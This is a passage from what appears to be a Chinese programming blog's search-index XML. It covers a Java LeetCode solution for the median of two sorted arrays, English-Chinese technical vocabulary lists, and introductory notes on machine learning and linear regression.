class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> leetCode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: Rupert Tears</span></span><br><span class="line"><span class="comment"> * Date: Created in 0:32 2022/11/5</span></span><br><span class="line"><span class="comment"> * Description: Thought is already is late, exactly is the earliest time.</span></span><br><span class="line"><span class="comment"> * 寻找两个正序数组的中位数</span></span><br><span class="line"><span class="comment"> * 给定两个大小分别为 m 和 n 的正序（从小到大）数组 nums1 和 nums2。请你找出并返回这两个正序数组的 中位数 。</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * 算法的时间复杂度应该为 O(log (m+n)) 。</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * 输入：nums1 = [1,3], nums2 = [2]</span></span><br><span class="line"><span class="comment"> * 输出：2.00000</span></span><br><span class="line"><span class="comment"> * 解释：合并数组 = [1,2,3] ，中位数 2</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * 输入：nums1 = [1,2], nums2 = [3,4]</span></span><br><span class="line"><span class="comment"> * 输出：2.50000</span></span><br><span class="line"><span class="comment"> * 解释：合并数组 = [1,2,3,4] ，中位数 (2 + 3) / 2 = 2.5</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * 解题思路：将数组进行合并，根据长度情况取中位数</span></span><br><span class="line"><span class="comment"> * 如何在数组中插入元素</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * 数组中存放的都为正整数时：以下算法满足</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Aigo_004</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span>[] nums1 = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;;</span><br><span class="line">        <span class="type">int</span>[] nums2 = &#123;<span class="number">1</span>, <span class="number">2</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">double</span> <span class="variable">result</span> <span class="operator">=</span> findMedianSortedArrays(nums1, nums2);</span><br><span class="line"></span><br><span class="line">        System.out.println(result);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">double</span> <span class="title function_">findMedianSortedArrays</span><span class="params">(<span class="type">int</span>[] nums1, <span class="type">int</span>[] nums2)</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        List&lt;String&gt; arr1 = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        List&lt;String&gt; arr2 = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> k : nums1) &#123;</span><br><span class="line">            arr1.add(String.valueOf(k));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> k : nums2) &#123;</span><br><span class="line">            arr2.add(String.valueOf(k));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;arr1:&quot;</span> + arr1);</span><br><span class="line">        System.out.println(<span class="string">&quot;arr2:&quot;</span> + arr2);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">len1</span> <span class="operator">=</span> arr1.size();</span><br><span class="line">        <span class="type">int</span> <span class="variable">len2</span> <span class="operator">=</span> arr2.size();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (len1 == <span class="number">0</span> &amp;&amp; len2 != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">resLength</span> <span class="operator">=</span> arr2.size();</span><br><span class="line">            <span class="keyword">if</span> (resLength % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">res1</span> <span class="operator">=</span> arr2.get((resLength / <span class="number">2</span>) - <span class="number">1</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">res2</span> <span class="operator">=</span> arr2.get((resLength / <span class="number">2</span>));</span><br><span class="line">                <span class="type">int</span> <span class="variable">v1</span> <span class="operator">=</span> Integer.parseInt(res1);</span><br><span class="line">                <span class="type">int</span> <span class="variable">v2</span> <span class="operator">=</span> Integer.parseInt(res2);</span><br><span class="line">                <span class="type">double</span> <span class="variable">sum</span> <span class="operator">=</span> (v1 + v2);</span><br><span class="line">                <span class="type">double</span> <span class="variable">res</span> <span class="operator">=</span> sum / <span class="number">2</span>;</span><br><span class="line">                System.out.println(res);</span><br><span class="line">                <span class="keyword">return</span> res;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">res1</span> <span class="operator">=</span> arr2.get((resLength / <span class="number">2</span>));</span><br><span class="line">                <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> Integer.parseInt(res1);</span><br><span class="line">                System.out.println(res);</span><br><span class="line">                <span class="keyword">return</span> res;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (len1 != <span class="number">0</span> &amp;&amp; len2 == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">resLength</span> <span class="operator">=</span> arr1.size();</span><br><span class="line">            <span class="keyword">if</span> (resLength % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">res1</span> <span class="operator">=</span> arr1.get((resLength / <span class="number">2</span>) - <span class="number">1</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">res2</span> <span class="operator">=</span> arr1.get((resLength / <span class="number">2</span>));</span><br><span class="line">                <span class="type">int</span> <span class="variable">v1</span> <span class="operator">=</span> Integer.parseInt(res1);</span><br><span class="line">                <span class="type">int</span> <span class="variable">v2</span> <span class="operator">=</span> Integer.parseInt(res2);</span><br><span class="line">                <span class="type">double</span> <span class="variable">sum</span> <span class="operator">=</span> (v1 + v2);</span><br><span class="line">                <span class="type">double</span> <span class="variable">res</span> <span class="operator">=</span> sum / <span class="number">2</span>;</span><br><span class="line">                System.out.println(res);</span><br><span class="line">                <span class="keyword">return</span> res;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">res1</span> <span class="operator">=</span> arr1.get((resLength / <span class="number">2</span>));</span><br><span class="line">                <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> Integer.parseInt(res1);</span><br><span class="line">                System.out.println(res);</span><br><span class="line">                <span class="keyword">return</span> res;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (len2 &gt;= len1) &#123;</span><br><span class="line">            <span class="comment">// nums1 次插入数据</span></span><br><span class="line">            <span class="keyword">for</span> (String s : arr1) &#123;     <span class="comment">// len1 插入</span></span><br><span class="line">                <span class="comment">// nums1 中的每一个数字和 插入数字比对</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; arr2.size(); j++) &#123;     <span class="comment">// 最多4次比对</span></span><br><span class="line">                    <span class="comment">// 如果相等</span></span><br><span class="line">                    <span class="keyword">if</span> (arr2.get(j).equals(s)) &#123;</span><br><span class="line">                        arr2.add(j, s);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">// 若小于目标值</span></span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">if</span> (Integer.parseInt(arr2.get(j)) &gt; Integer.parseInt(s)) &#123;</span><br><span class="line">                        arr2.add(j, s);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> (j == arr2.size() - <span class="number">1</span>) &#123;</span><br><span class="line">                            arr2.add(j + <span class="number">1</span>, s);</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(arr2);</span><br><span class="line">            <span class="type">int</span> <span class="variable">resLength</span> <span class="operator">=</span> arr2.size();</span><br><span class="line">            <span class="keyword">if</span> (resLength % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">res1</span> <span class="operator">=</span> arr2.get((resLength / <span class="number">2</span>) - <span class="number">1</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">res2</span> <span class="operator">=</span> arr2.get((resLength / <span class="number">2</span>));</span><br><span class="line">                <span class="type">int</span> <span class="variable">v1</span> <span class="operator">=</span> Integer.parseInt(res1);</span><br><span class="line">                <span class="type">int</span> <span class="variable">v2</span> <span class="operator">=</span> Integer.parseInt(res2);</span><br><span class="line">                <span class="type">double</span> <span class="variable">sum</span> <span class="operator">=</span> (v1 + v2);</span><br><span class="line">                <span class="type">double</span> <span class="variable">res</span> <span class="operator">=</span> sum / <span class="number">2</span>;</span><br><span class="line">                System.out.println(res);</span><br><span class="line">                <span class="keyword">return</span> res;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">res1</span> <span class="operator">=</span> arr2.get((resLength / <span class="number">2</span>));</span><br><span class="line">                <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> Integer.parseInt(res1);</span><br><span class="line">                System.out.println(res);</span><br><span class="line">                <span class="keyword">return</span> res;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2向1插入数据</span></span><br><span class="line">        <span class="keyword">for</span> (String s : arr2) &#123;</span><br><span class="line">            <span class="comment">// 与1中的逐一比对</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; arr1.size(); j++) &#123;</span><br><span class="line">                <span class="comment">// 如果相等</span></span><br><span class="line">                <span class="keyword">if</span> (s.equals(arr1.get(j))) &#123;</span><br><span class="line">                    arr1.add(j, s);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 如果小于</span></span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (Integer.parseInt(s) &lt; Integer.parseInt(arr1.get(j))) &#123;</span><br><span class="line">                    arr1.add(j, s);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (j == arr1.size() - <span class="number">1</span>) &#123;</span><br><span class="line">                        arr1.add(s);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(arr1);</span><br><span class="line">        <span class="type">int</span> <span class="variable">resLength</span> <span class="operator">=</span> arr1.size();</span><br><span class="line">        <span class="keyword">if</span> (resLength % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">res1</span> <span class="operator">=</span> arr1.get((resLength / <span class="number">2</span>) - <span class="number">1</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">res2</span> <span class="operator">=</span> arr1.get((resLength / <span class="number">2</span>));</span><br><span class="line">            <span class="type">int</span> <span class="variable">v1</span> <span class="operator">=</span> Integer.parseInt(res1);</span><br><span class="line">            <span class="type">int</span> <span class="variable">v2</span> <span class="operator">=</span> Integer.parseInt(res2);</span><br><span class="line">            <span class="type">double</span> <span class="variable">sum</span> <span class="operator">=</span> (v1 + v2);</span><br><span class="line">            <span class="type">double</span> <span class="variable">res</span> <span class="operator">=</span> sum / <span class="number">2</span>;</span><br><span class="line">            System.out.println(res);</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">res1</span> <span class="operator">=</span> arr1.get((resLength / <span class="number">2</span>));</span><br><span class="line">            <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> Integer.parseInt(res1);</span><br><span class="line">            System.out.println(res);</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法练习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>专业词汇积累004</title>
      <link href="/blog/2257838b.html/"/>
      <url>/blog/2257838b.html/</url>
      
        <content type="html"><![CDATA[<h1 id="Professional-Vocabulary-Accumulation-004"><a href="#Professional-Vocabulary-Accumulation-004" class="headerlink" title="Professional Vocabulary Accumulation_004"></a>Professional Vocabulary Accumulation_004</h1><ul><li>Returns a BigDecimal whose value is the absolute value of this BigDecimal,and whose scale is this.scale().</li><li>返回一个BigDecimal，其值为这个BigDecimal 的绝对值，其小数位数为 this.scale().</li><li>Duplicate tab </li><li>重复的选项卡</li><li>The digit in the num of gongan beian.</li><li>在公安备案中的数字。</li><li>Creative Commons 4.0 International License.</li><li>知识共享4.0国际许可证</li><li>You can set a language value if you prefer a translated version of CC license.</li><li>如果你更喜欢CC许可证的翻译版本，你可以去设置语言值。</li><li>You can find the specific and correct abbreviation</li><li>你可以找到具体的和正确的缩写</li></ul><hr><ul><li>sidebar settings</li><li>侧边栏设置</li><li>scheme settings</li><li>方案设置</li><li>meun settings</li><li>菜单设置</li><li>custom page settings</li><li>自定义页面设置</li></ul>]]></content>
      
      
      <categories>
          
          <category> 专业词汇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 专业词汇 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>线性回归实战准备</title>
      <link href="/blog/b3c88b03.html/"/>
      <url>/blog/b3c88b03.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一：Scikit-learn"><a href="#一：Scikit-learn" class="headerlink" title="一：Scikit-learn"></a>一：Scikit-learn</h1><h2 id="认知"><a href="#认知" class="headerlink" title="认知"></a>认知</h2><p>Python 语言中专门针对机器学习应用而发展起来的一款开源框架（算法库），可以实现数据预处理、分类、回归、降维、模型选择等常用机器学习算法。</p><h2 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h2><ul><li>集成了机器学习中各类成熟的算法，容易安装和使用，样例丰富，教程和文档非常详细</li><li>仅支持 Python 语言，不支持深度学习和强化学习</li></ul><h2 id="官网"><a href="#官网" class="headerlink" title="官网"></a>官网</h2><p><a href="https://scikit-learn.org/stable/index.html">https://scikit-learn.org/stable/index.html</a></p><h1 id="二：调用-Sklearn-求解线性回归问题"><a href="#二：调用-Sklearn-求解线性回归问题" class="headerlink" title="二：调用 Sklearn 求解线性回归问题"></a>二：调用 Sklearn 求解线性回归问题</h1><ul><li>调用 Sklearn 构建模型<ul><li>确定参数值</li><li>对新的数据进行预测</li></ul></li><li>评估模型表现<ul><li>均方误差（MSE）：MSE值越小越好</li><li>R方值（R<sup>2</sup>）：R<sup>2</sup>分数越接近1越好</li></ul></li><li>图形展示</li></ul><p><img src="/blog/b3c88b03.html/image-20221104232542050.png"></p><p><img src="/blog/b3c88b03.html/image-20221104233438146.png"></p><p><img src="/blog/b3c88b03.html/image-20221104233644453.png"></p><p><img src="/blog/b3c88b03.html/image-20221104233732239.png"></p><h1 id="三：文献参考"><a href="#三：文献参考" class="headerlink" title="三：文献参考"></a>三：文献参考</h1><p><a href="https://scikit-learn.org/stable/modules/linear_model.html#ordinary-least-squares">Linear Models — scikit-learn 1.1.3 documentation</a></p>]]></content>
      
      
      <categories>
          
          <category> 人工智能 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 人工智能 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>专业词汇积累003</title>
      <link href="/blog/bc331628.html/"/>
      <url>/blog/bc331628.html/</url>
      
        <content type="html"><![CDATA[<h1 id="Professional-Vocabulary-Accumulation-003"><a href="#Professional-Vocabulary-Accumulation-003" class="headerlink" title="Professional Vocabulary Accumulation_003"></a>Professional Vocabulary Accumulation_003</h1><ul><li><p>Constructs an empty HashMap with the specified initial capacity and the default load factor(0.75)</p></li><li><p>构造一个具有初始容量和默认负载因子（0.75）的空 HashMap</p></li><li><p>The substring begins at the specified beginIndex and extends to the character at index endIndex -1.</p></li><li><p>子字符串从指定的 beginIndex开始，延伸到索引endIndex -1 处的字符</p></li><li><p>Thus the length of the substring is endIndex - beginIndex.</p></li><li><p>因此，子字符串的长度为endIndex - beginIndex。</p></li><li><p>If the char value specitied by the index is a surrogate, the surrogate value is returned.</p></li><li><p>如果索引指定的字符值是代理值，则返回代理指。</p></li><li><p>Artificial Intelligence</p></li><li><p>人工智能</p></li><li><p>Symbolic Learning</p></li><li><p>符号学习</p></li><li><p>Machine Learning</p></li><li><p>机器学习</p></li><li><p>Supervised Learning</p></li><li><p>监督学习</p></li><li><p>Unsupervised Learning</p></li><li><p>无监督学习</p></li><li><p>Semi-supervised Learning</p></li><li><p>半监督学习</p></li><li><p>Reinforcement Learning</p></li><li><p>强化学习</p></li><li><p>Regression Analysis</p></li><li><p>回归分析</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 专业词汇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 专业词汇 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>回归分析</title>
      <link href="/blog/763d1c5d.html/"/>
      <url>/blog/763d1c5d.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一：什么是回归分析？（Regression-Analysis）"><a href="#一：什么是回归分析？（Regression-Analysis）" class="headerlink" title="一：什么是回归分析？（Regression Analysis）"></a>一：什么是回归分析？（Regression Analysis）</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>回归分析：根据数据，确定两种或两种以上变量间相互依赖的定量关系</p><p>函数表达式：</p><ul><li>回归<ul><li>变量数<ul><li>一元回归：y &#x3D; f (x)</li><li>多元回归：y&#x3D; f (x<sub>1</sub>,x<sub>2</sub>···x<sub>n</sub>)</li></ul></li><li>函数关系<ul><li>线性回归：y &#x3D; ax + b</li><li>非线性回归：y &#x3D; ax<sup>2</sup> + bx + c</li></ul></li></ul></li></ul><p>定位：机器学习中的监督学习</p><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><ul><li>百万人口医生数量预测区域人均寿命</li><li>年龄预测身高</li><li>住宅面积预测售价</li></ul><h1 id="二：线性回归"><a href="#二：线性回归" class="headerlink" title="二：线性回归"></a>二：线性回归</h1><p>线性回归：回归分析中，变量与因变量存在线性关系</p><p>函数表达式：y &#x3D; ax + b</p><p>举例：</p><ul><li>线性回归：距离 &#x3D; 速度 × 时间＋初始距离</li><li>非线性回归：距离＝加速度×时间的平方＋初始距离</li></ul><h1 id="三：回归问题求解"><a href="#三：回归问题求解" class="headerlink" title="三：回归问题求解"></a>三：回归问题求解</h1><h2 id="求解过程"><a href="#求解过程" class="headerlink" title="求解过程"></a>求解过程</h2><p>问题：面积１１０平米售价１５０万是否值得投资？</p><table><thead><tr><th align="center">面积（A）</th><th align="center">售价（P）</th></tr></thead><tbody><tr><td align="center">79</td><td align="center">402654</td></tr><tr><td align="center">92</td><td align="center">948562</td></tr><tr><td align="center">…</td><td align="center">…</td></tr><tr><td align="center">108</td><td align="center">1045687</td></tr><tr><td align="center">110</td><td align="center">？？？</td></tr><tr><td align="center">118</td><td align="center">１578142</td></tr><tr><td align="center">…</td><td align="center">…</td></tr></tbody></table><ol><li><p>确定　P、A　间的定量关系</p><p>P ＝ f (Ａ)</p><p>线性模型：ｙ＝ａｘ＋ｂ</p></li><li><p>根据关系预测合理价格</p><p>P（<sub>A&#x3D;110</sub>）&#x3D; f (110)</p></li><li><p>做出判断</p><p>若150w &gt;&gt; P，则不值得投资。</p></li></ol><h2 id="问题核心"><a href="#问题核心" class="headerlink" title="问题核心"></a>问题核心</h2><p>线性模型：ｙ＝ａｘ＋ｂ，寻找合理的ａ和ｂ；</p><p>假设ｘ为变量，ｙ为对应的结果，ｙ＇为模型输出结果，</p><p>目标变为：ｙ＇尽可能接近ｙ（ｍ为样本数量）</p><p><img src="http://aiyingke.cn/images/%E5%9B%9E%E5%BD%92%E9%97%AE%E9%A2%9801.png"></p><p>平方：消除做差产生负数情况；</p><p>系数：方便求导运算</p><p>损失函数，所得值期望越小越好；</p><p><img src="http://aiyingke.cn/images/%E5%9B%9E%E5%BD%92%E9%97%AE%E9%A2%9803.png"></p><p><img src="http://aiyingke.cn/images/%E5%9B%9E%E5%BD%92%E9%97%AE%E9%A2%9802.png"></p><h2 id="梯度下降法"><a href="#梯度下降法" class="headerlink" title="梯度下降法"></a>梯度下降法</h2><p>寻找极小值的一种方法。</p><p>通常向函数上当前点对应梯度（或者是近似梯度）的反方向的规定步长距离点进行迭代搜索，直到在极小点收敛。</p><p><img src="http://aiyingke.cn/images/%E5%9B%9E%E5%BD%92%E9%97%AE%E9%A2%9804.png"></p><h3 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h3><p><img src="http://aiyingke.cn/images/%E5%9B%9E%E5%BD%92%E9%97%AE%E9%A2%9806.png"></p><img src="http://aiyingke.cn/images/回归问题07.png" style="zoom: 67%;"><p><img src="http://aiyingke.cn/images/%E5%9B%9E%E5%BD%92%E9%97%AE%E9%A2%9808.png"></p><p><img src="http://aiyingke.cn/images/%E5%9B%9E%E5%BD%92%E9%97%AE%E9%A2%9809.png"></p><h1 id="四：求解步骤"><a href="#四：求解步骤" class="headerlink" title="四：求解步骤"></a>四：求解步骤</h1><ol><li>选择回归模型</li><li>生成损失函数</li><li>使用梯度下降或者其他方式求解，最小化损失函数的模型参数</li><li>使用模型预测合理房价，根据预测结果做出判断</li></ol><img src="http://aiyingke.cn/images/RupertTears.jpg" style="zoom: 33%;">]]></content>
      
      
      <categories>
          
          <category> 人工智能 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 人工智能 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>机器学习简介</title>
      <link href="/blog/21043101.html/"/>
      <url>/blog/21043101.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一：什么是机器学习？（Machine-Learning）"><a href="#一：什么是机器学习？（Machine-Learning）" class="headerlink" title="一：什么是机器学习？（Machine Learning）"></a>一：什么是机器学习？（Machine Learning）</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>机器学习是一种实现人工智能的方法。</p><p>从数据中寻找规律、建立关系，根据建立的关系去解决问题。</p><p>从数据中学习实现自我优化与升级。</p><h1 id="二：机器学习与计算机程序的差异"><a href="#二：机器学习与计算机程序的差异" class="headerlink" title="二：机器学习与计算机程序的差异"></a>二：机器学习与计算机程序的差异</h1><p>例如：小明1个月工资1000，每月增长10%，问第10个月小明的工资是多少？</p><h2 id="传统算法："><a href="#传统算法：" class="headerlink" title="传统算法："></a>传统算法：</h2><p>y &#x3D; 1000 × 1.1 <sup>x</sup></p><table><thead><tr><th align="center">月份 x</th><th align="center">工资 y</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">1000</td></tr><tr><td align="center">2</td><td align="center">1100</td></tr><tr><td align="center">3</td><td align="center">1210</td></tr><tr><td align="center">4</td><td align="center">1331</td></tr><tr><td align="center">5</td><td align="center">1464</td></tr><tr><td align="center">6</td><td align="center">1610</td></tr><tr><td align="center">7</td><td align="center">1771</td></tr><tr><td align="center">8</td><td align="center">1984</td></tr><tr><td align="center">9</td><td align="center">2143</td></tr><tr><td align="center">10</td><td align="center">2357</td></tr></tbody></table><p>输入：第一个月的工资，以及计算公式</p><p>处理：计算机进行运算</p><p>输出：结果，第10月的工资</p><h2 id="机器学习"><a href="#机器学习" class="headerlink" title="机器学习"></a>机器学习</h2><p>输入：月份、每月的工资</p><p>处理：计算机进行分析，得出一个 F(x) 公式</p><p>输出：预测结果</p><h1 id="三：机器学习的应用场景"><a href="#三：机器学习的应用场景" class="headerlink" title="三：机器学习的应用场景"></a>三：机器学习的应用场景</h1><ul><li>数据挖掘</li><li>计算机视觉</li><li>自然语言处理</li><li>证券分析</li><li>医学诊断</li><li>机器人</li><li>DNA测序</li></ul><p>由上可知：机器学习是实现人工智能的主流方法！</p><h1 id="四：实现机器学习的基本框架"><a href="#四：实现机器学习的基本框架" class="headerlink" title="四：实现机器学习的基本框架"></a>四：实现机器学习的基本框架</h1><p>将训练数据喂给计算机，计算机自动求解数据关系，在新的数据上做出预测或者给出建议。</p><p>数据 👉 数据关系 👉 预测、建议 👉 解决问题</p><h1 id="五：机器学习的类别"><a href="#五：机器学习的类别" class="headerlink" title="五：机器学习的类别"></a>五：机器学习的类别</h1><ul><li>监督学习（Supervised Learning）<ul><li>训练数据包括正确的结果（标签 - label）</li><li>可画出类别界限</li><li>应用<ul><li>人类识别</li><li>语音翻译</li><li>医学诊断</li></ul></li></ul></li><li>无监督学习（Unsupervised Learning）<ul><li>训练数据不包括正确的结果</li><li>可以对数据进行类别划分，但不能画出界限</li><li>应用<ul><li>新闻聚类</li></ul></li></ul></li><li>半监督学习（Semi-supervised Learning）<ul><li>训练数据包括少量正确的结果</li><li>可以对数据进行类别划分，能画出界限</li><li>即混合学习</li></ul></li><li>强化学习（Reinforcement Learning）<ul><li>根据每次结果收获的奖惩进行学习，实现优化</li><li>过程<ul><li>程序初始化</li><li>根据执行效果给与奖励或者惩罚（分数）</li><li>程序逐步寻找获得高分的方法</li></ul></li><li>应用<ul><li>AlphaGo</li></ul></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 人工智能 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 人工智能 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LeetCode_无重复字符的最长子串</title>
      <link href="/blog/cc8ddf7.html/"/>
      <url>/blog/cc8ddf7.html/</url>
      
        <content type="html"><![CDATA[<h1 id="无重复字符串的最长子串"><a href="#无重复字符串的最长子串" class="headerlink" title="无重复字符串的最长子串"></a><center>无重复字符串的最长子串</center></h1><p>给定一个字符串 s ，请你找出其中不含有重复字符的 最长子串 的长度。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span 